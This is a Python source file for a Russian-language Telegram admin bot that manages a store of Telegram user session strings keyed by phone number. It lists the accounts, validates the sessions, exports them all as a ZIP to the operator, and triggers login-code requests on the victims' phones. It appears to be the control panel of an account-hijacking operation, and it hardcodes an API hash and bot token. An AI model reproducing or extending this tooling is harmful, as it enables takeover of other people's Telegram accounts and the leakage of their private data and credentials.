import os
import sys
import asyncio
import logging
import zipfile
import io
from datetime import datetime
from telethon import TelegramClient, events, errors
from telethon.sessions import StringSession

# ============================================================
# КОНФИГ
# ============================================================
API_ID = int(os.environ.get("API_ID", 37803152))
API_HASH = os.environ.get("API_HASH", "5d34acaeda36aa1a308e40ae31668795")
BOT_TOKEN = os.environ.get("BOT_TOKEN", "8690036172:AAGj9YweZMAdEm4tI5YTKJs_n1oAB-BN78c")
ADMIN_IDS = [int(x.strip()) for x in os.environ.get("ADMIN_IDS", "8866175391").split(",") if x.strip()]

os.makedirs("logs", exist_ok=True)
logging.basicConfig(
    level=logging.INFO,
    format="%(asctime)s [%(levelname)s] %(message)s",
    handlers=[logging.FileHandler("logs/admin_bot.log"), logging.StreamHandler()]
)
logger = logging.getLogger(__name__)

sys.path.insert(0, os.path.dirname(os.path.abspath(__file__)))
from session_manager import SessionManager

session_manager = SessionManager()
session_manager.configure(API_ID, API_HASH)

# ============================================================
# АДМИН-БОТ
# ============================================================
class AdminBot:
    def __init__(self):
        self.client = TelegramClient("admin_bot", API_ID, API_HASH)
        self.session_manager = session_manager

    async def start(self):
        await self.client.start(bot_token=BOT_TOKEN)
        logger.info("Админ-бот запущен")
        
        stats = await self.session_manager.check_all_sessions()
        logger.info(f"Статистика при старте: {stats}")

        @self.client.on(events.NewMessage(pattern="/start"))
        async def start_cmd(event):
            if event.sender_id not in ADMIN_IDS:
                await event.respond("⛔ Доступ запрещён")
                return
            await event.respond("👋 Привет! Используй /admin для управления.")

        @self.client.on(events.NewMessage(pattern="/admin"))
        async def admin_cmd(event):
            if event.sender_id not in ADMIN_IDS:
                await event.respond("⛔ Доступ запрещён")
                return
            stats = self.session_manager.get_stats()
            buttons = [
                [{"text": "📱 Аккаунты", "callback_data": "accounts"}],
                [{"text": "📊 Статистика", "callback_data": "stats"}],
                [{"text": "📦 Сессии (ZIP)", "callback_data": "export"}]
            ]
            await event.respond(
                f"🔐 Панель управления\n\n"
                f"📊 Статистика:\n"
                f"├ Всего: {stats.get('total', 0)}\n"
                f"├ ✅ Валидных: {stats.get('valid', 0)}\n"
                f"└ ❌ Невалидных: {stats.get('invalid', 0)}",
                buttons=buttons
            )

        @self.client.on(events.NewMessage(pattern="/stats"))
        async def stats_cmd(event):
            if event.sender_id not in ADMIN_IDS:
                return
            stats = self.session_manager.get_stats()
            await event.respond(
                f"📊 Статистика сессий:\n\n"
                f"├ Всего: {stats.get('total', 0)}\n"
                f"├ ✅ Валидных: {stats.get('valid', 0)}\n"
                f"└ ❌ Невалидных: {stats.get('invalid', 0)}\n\n"
                f"📅 {datetime.now().strftime('%Y-%m-%d %H:%M')}"
            )

        @self.client.on(events.CallbackQuery)
        async def callback_handler(event):
            if event.sender_id not in ADMIN_IDS:
                await event.answer("⛔ Доступ запрещён", alert=True)
                return
            data = event.data.decode("utf-8")
            if data == "accounts":
                await self._show_accounts(event)
            elif data == "stats":
                await stats_cmd(event)
            elif data == "export":
                await self._export_sessions(event)
            elif data.startswith("code_"):
                _, idx = data.split("_")
                await self._request_code(event, int(idx))

        @self.client.on(events.NewMessage)
        async def message_handler(event):
            pass

        await self.client.run_until_disconnected()

    async def _show_accounts(self, event):
        accounts = self.session_manager.get_valid_sessions()
        if not accounts:
            await event.edit("📭 Нет валидных аккаунтов")
            return
        text = "📱 Список аккаунтов:\n\n"
        buttons = []
        for idx, acc in enumerate(accounts):
            phone = acc.get("phone", "Unknown")
            created = acc.get("created_at", "")[:10]
            filename = acc.get("file", "unknown")
            text += f"{idx+1}. 📱 {phone}\n   📅 {created}\n   💾 {filename}\n\n"
            buttons.append([{
                "text": f"🔑 Код для {phone}",
                "callback_data": f"code_{idx}"
            }])
        buttons.append([{"text": "◀️ Назад", "callback_data": "back"}])
        await event.edit(text, buttons=buttons)

    async def _request_code(self, event, index: int):
        account = self.session_manager.get_session_by_index(index)
        if not account:
            await event.answer("❌ Аккаунт не найден", alert=True)
            return
        phone = account.get("phone")
        session_string = self.session_manager.get_session_file(phone)
        if not session_string:
            await event.answer("❌ Сессия не найдена", alert=True)
            return
        await event.answer(f"⏳ Отправляю код на {phone}...")
        try:
            client = TelegramClient(StringSession(session_string), API_ID, API_HASH)
            await client.connect()
            if not await client.is_user_authorized():
                await event.edit("❌ Сессия невалидна")
                return
            await client.send_code_request(phone)
            await event.edit(f"✅ Код отправлен на {phone}\nℹ️ Попросите пользователя проверить Telegram")
        except errors.FloodWaitError as e:
            await event.edit(f"⏳ Подождите {e.seconds} секунд")
        except Exception as e:
            logger.error(f"Ошибка: {e}")
            await event.edit(f"❌ Ошибка: {str(e)}")
        finally:
            await client.disconnect()

    async def _export_sessions(self, event):
        accounts = self.session_manager.get_valid_sessions()
        if not accounts:
            await event.edit("📭 Нет сессий")
            return
        await event.edit("⏳ Создаю архив...")
        zip_buffer = io.BytesIO()
        with zipfile.ZipFile(zip_buffer, "w", zipfile.ZIP_DEFLATED) as zf:
            for acc in accounts:
                phone = acc.get("phone", "unknown")
                session_string = self.session_manager.get_session_file(phone)
                if session_string:
                    zf.writestr(f"{phone.replace('+', '')}.session", session_string)
        zip_buffer.seek(0)
        await self.client.send_file(
            event.sender_id,
            zip_buffer,
            file_name=f"sessions_{datetime.now().strftime('%Y%m%d_%H%M')}.zip",
            caption=f"📦 Экспорт сессий\nВсего: {len(accounts)}"
        )
        await event.edit("✅ Архив отправлен")

# ============================================================
# ЗАПУСК
# ============================================================
if __name__ == "__main__":
    if not all([API_ID, API_HASH, BOT_TOKEN, ADMIN_IDS]):
        logger.error("Не все переменные окружения заданы!")
        sys.exit(1)
    bot = AdminBot()
    asyncio.run(bot.start())